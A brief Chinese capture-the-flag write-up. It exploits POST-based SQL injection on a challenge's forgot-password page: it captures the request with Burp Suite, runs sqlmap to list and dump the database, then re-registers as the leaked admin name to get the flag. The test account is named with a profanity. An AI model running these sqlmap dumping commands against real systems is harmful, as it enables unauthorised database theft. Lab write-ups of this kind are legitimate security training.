2019-07-16

工控云管理系统新添加的登录和注册页面存在漏洞，请找出flag。

先注册用户。注册信息一律为fuck。

登录有回显普通用户登录成功,没什么用

找回 admin 密码,提示没有该用户。

忘记密码页面有sql注入/post型/。Burpsuite抓包，保存为xctf,sqlmap注入。

sqlmap -r xctf

不要直接–dump，先查库名。

sqlmap -r xctf --dbs

sqlmap -r xctf -D cetc004 --dump

查出用户 c3tlwDmIn23

然后以此为用户名重新注册，登录得flag.

flag
